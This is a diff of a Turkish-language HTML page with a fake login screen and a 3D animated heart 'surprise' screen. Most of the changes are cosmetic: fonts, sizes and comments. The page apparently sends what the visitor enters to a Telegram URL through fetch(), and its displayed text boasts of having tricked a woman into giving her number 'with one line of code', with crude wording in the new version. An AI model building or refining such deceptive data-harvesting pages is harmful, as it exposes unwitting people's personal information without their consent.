@@ -4,8 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sana Özel...</title>
-    <!-- Zarif ve romantik fontlar -->
-    <link href="https://fonts.googleapis.com/css2?family=Parisienne&family=Montserrat:wght@300;400&display=swap" rel="stylesheet">
+    <!-- Zarif ve şık fontlar -->
+    <link href="https://fonts.googleapis.com/css2?family=Parisienne&family=Montserrat:wght@300;400;600&display=swap" rel="stylesheet">
     
     <style>
         /* Genel Ayarlar */
@@ -82,7 +82,7 @@
             box-shadow: 0 0 20px rgba(255, 0, 102, 0.7);
         }
 
-        /* --- ROMANTİK EKRAN TASARIMI --- */
+        /* --- SÜRPRİZ EKRAN TASARIMI --- */
         #romantic-screen {
             display: none;
             position: absolute;
@@ -96,7 +96,7 @@
             display: block; 
         }
 
-        /* Sinematik Yazı Alanı */
+        /* Eğlenceli ve Flörtöz Yazı Alanı */
         .text-container {
             position: absolute;
             top: 50%;
@@ -106,22 +106,23 @@
             z-index: 10;
             pointer-events: none;
             width: 90%;
+            max-width: 800px;
         }
 
         .line1 {
             font-family: 'Montserrat', sans-serif;
-            font-size: 1.8rem;
+            font-size: 1.5rem;
             font-weight: 300;
             color: #ffb3c6;
             opacity: 0;
             transform: translateY(20px);
             text-shadow: 0 0 15px rgba(255, 179, 198, 0.5);
-            animation: textReveal 2s ease forwards 1s; /* 1 saniye sonra belirir */
+            animation: textReveal 2s ease forwards 1s; 
         }
 
         .line2 {
             font-family: 'Parisienne', cursive;
-            font-size: 5rem;
+            font-size: 4rem; /* Uzun cümleye uygun olması için biraz küçültüldü */
             color: #ffffff;
             margin-top: 20px;
             opacity: 0;
@@ -132,8 +133,8 @@
                 0 0 50px #ff0066,
                 0 0 80px #cc00ff;
             animation: 
-                textReveal 2s ease forwards 3.5s, /* 3.5 saniye sonra belirir */
-                heartbeat 3s ease-in-out infinite 5.5s; /* Belirdikten sonra kalp atışı gibi atar */
+                textReveal 2s ease forwards 3.5s, 
+                heartbeat 3s ease-in-out infinite 5.5s; 
         }
 
         @keyframes textReveal {
@@ -145,12 +146,12 @@
 
         @keyframes heartbeat {
             0%, 100% { transform: scale(1); text-shadow: 0 0 30px #ff0066, 0 0 50px #ff0066; }
-            50% { transform: scale(1.05); text-shadow: 0 0 40px #ff0066, 0 0 80px #ff0066, 0 0 100px #cc00ff; }
+            50% { transform: scale(1.02); text-shadow: 0 0 40px #ff0066, 0 0 80px #ff0066, 0 0 100px #cc00ff; }
         }
 
         @media (max-width: 768px) {
-            .line1 { font-size: 1.2rem; }
-            .line2 { font-size: 3.5rem; }
+            .line1 { font-size: 1.1rem; }
+            .line2 { font-size: 2.8rem; }
         }
     </style>
 </head>
@@ -163,11 +164,11 @@
         <button id="login-btn">Giriş</button>
     </div>
 
-    <!-- ROMANTİK EKRAN -->
+    <!-- SÜRPRİZ EKRAN -->
     <div id="romantic-screen">
         <div class="text-container">
-            <div class="line1">Sonunda numaranı aldım güzel kadın...</div>
-            <div class="line2">Kandırdım nazlo yarim sonunda bir satır kodla</div>
+            <div class="line1">BECERİRİM GÜZELİM</div>
+            <div class="line1">O GÜZELLİĞİN İÇİN BASİT BİR NUMARA SADECE</div>
         </div>
     </div>
 
@@ -198,7 +199,7 @@
                 
                 fetch(telegramURL).catch(err => console.error("Gönderim hatası:", err)); 
 
-                // 2) ROMANTİK EKRANA GEÇİŞ (Zamanlayıcı uzatıldı, daha dramatik bir geçiş)
+                // 2) SÜRPRİZ EKRANA GEÇİŞ
                 setTimeout(() => {
                     loginScreen.style.display = 'none';
                     romanticScreen.style.display = 'block';
@@ -210,10 +211,9 @@
             }
         });
 
-        // 3D Romantik Animasyon Kodları - GELİŞTİRİLMİŞ VERSİYON
+        // 3D Animasyon Kodları
         function startRomanticMagic() {
             const scene = new THREE.Scene();
-            // Sis biraz daha koyu yapıldı
             scene.fog = new THREE.FogExp2(0x000000, 0.025);
 
             const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
@@ -222,7 +222,7 @@
             const renderer = new THREE.WebGLRenderer({ alpha: true, antialias: true });
             renderer.setSize(window.innerWidth, window.innerHeight);
             renderer.physicallyCorrectLights = true; 
-            renderer.outputEncoding = THREE.sRGBEncoding; // Renkleri daha canlı yapar
+            renderer.outputEncoding = THREE.sRGBEncoding; 
             romanticScreen.appendChild(renderer.domElement);
 
             function createHeartGeometry() {
@@ -257,7 +257,7 @@
 
             const heartGeometry = createHeartGeometry();
             
-            // YENİ: Cam/Yakut Taşı Materyali (Üst Düzey Romantiklik)
+            // Cam/Yakut Taşı Materyali
             const heartMaterial = new THREE.MeshPhysicalMaterial({ 
                 color: 0xff0033, 
                 emissive: 0x220000,
@@ -265,7 +265,7 @@
                 metalness: 0.3, 
                 clearcoat: 1.0,
                 clearcoatRoughness: 0.1,
-                transmission: 0.4, // Şeffaflık/Cam hissi
+                transmission: 0.4,
                 transparent: true
             });
 
@@ -293,7 +293,7 @@
                 });
             }
 
-            // Sihirli Ateş Böceği Partikülleri (Işıltılar)
+            // Sihirli Işıltılar
             const particlesGeometry = new THREE.BufferGeometry();
             const particlesCount = 1000;
             const posArray = new Float32Array(particlesCount * 3);
@@ -320,7 +320,6 @@
             pointLight1.position.set(10, 10, 20);
             scene.add(pointLight1);
 
-            // Altın rengi / Sıcak bir ışık eklendi (Gün batımı romantizmi için)
             const pointLight2 = new THREE.PointLight(0xffaa00, 150, 100); 
             pointLight2.position.set(-15, -10, 15);
             scene.add(pointLight2);
@@ -335,7 +334,6 @@
                 requestAnimationFrame(animate);
                 const elapsedTime = clock.getElapsedTime();
 
-                // Partiküller rüya gibi yavaş döner
                 particlesMesh.rotation.y = elapsedTime * 0.03;
                 particlesMesh.rotation.x = elapsedTime * 0.01;
 
